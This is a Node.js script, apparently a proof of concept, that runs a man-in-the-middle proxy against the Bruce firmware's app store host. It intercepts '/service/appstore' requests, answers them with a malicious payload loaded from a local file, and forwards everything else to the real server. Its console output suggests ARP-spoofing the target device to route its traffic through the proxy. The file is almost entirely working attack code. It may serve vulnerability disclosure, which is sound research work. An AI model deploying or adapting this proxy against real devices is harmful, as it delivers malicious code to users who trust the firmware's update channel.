const http = require('http');
const fs = require('fs');
const path = require('path');

const TARGET_HOST = 'ghp.iceis.co.uk';
const TARGET_PORT = 80;
const PROXY_PORT = 8080;
const PAYLOAD_FILE = path.join(__dirname, 'poc-malicious-payload.js');

// Load the malicious payload
let maliciousPayload = '';
try {
  maliciousPayload = fs.readFileSync(PAYLOAD_FILE, 'utf8');
} catch(e) {
  console.error('Cannot read payload file:', e.message);
  process.exit(1);
}

// Create a proxy server that intercepts requests to ghp.iceis.co.uk
const server = http.createServer((req, res) => {
  const targetUrl = new URL(req.url, `http://${TARGET_HOST}:${TARGET_PORT}`);
  
  console.log(`[MITM] Intercepted: ${req.method} ${targetUrl.pathname}`);
  
  // Log what was being requested
  const chunks = [];
  req.on('data', chunk => chunks.push(chunk));
  req.on('end', () => {
    const body = Buffer.concat(chunks).toString();
    if (body) console.log(`[MITM] Request body: ${body.substring(0, 200)}`);
    
    // Check if this is an App Store request
    if (targetUrl.pathname.includes('/service/appstore')) {
      console.log('[MITM] *** APP STORE REQUEST DETECTED ***');
      console.log('[MITM] *** INJECTING MALICIOUS PAYLOAD ***');
      console.log(`[MITM] Payload size: ${maliciousPayload.length} bytes`);
      
      // Respond with malicious payload, claiming to be the App Store
      res.writeHead(200, {
        'Content-Type': 'text/plain; charset=utf-8',
        'Content-Length': Buffer.byteLength(maliciousPayload),
        'X-MITM-Injected': 'true',
        'X-Original-Request': targetUrl.pathname
      });
      res.end(maliciousPayload);
      return;
    }
    
    // Forward other requests to the real server (optional - could block them)
    console.log(`[MITM] Forwarding to ${TARGET_HOST}:${TARGET_PORT}...`);
    const proxyOptions = {
      hostname: TARGET_HOST,
      port: TARGET_PORT,
      path: targetUrl.pathname + targetUrl.search,
      method: req.method,
      headers: req.headers
    };
    
    const proxyReq = http.request(proxyOptions, (proxyRes) => {
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.pipe(res);
    });
    
    proxyReq.on('error', (err) => {
      console.error(`[MITM] Forward error: ${err.message}`);
      res.writeHead(502);
      res.end('MITM Proxy Error: ' + err.message);
    });
    
    if (body) proxyReq.write(body);
    proxyReq.end();
  });
});

server.listen(PROXY_PORT, () => {
  console.log('========================================');
  console.log('  Bruce Firmware MITM PoC Proxy');
  console.log('========================================');
  console.log(`Listening on port ${PROXY_PORT}`);
  console.log(`Intercepting: ${TARGET_HOST}:${TARGET_PORT}`);
  console.log(`Payload: ${PAYLOAD_FILE}`);
  console.log('');
  console.log('To test:');
  console.log(`  curl -x http://localhost:${PROXY_PORT} http://${TARGET_HOST}/service/appstore/`);
  console.log('');
  console.log('On the device, configure WiFi proxy to localhost:8080');
  console.log('or ARP-spoof the device to route traffic through this proxy.');
  console.log('========================================');
});
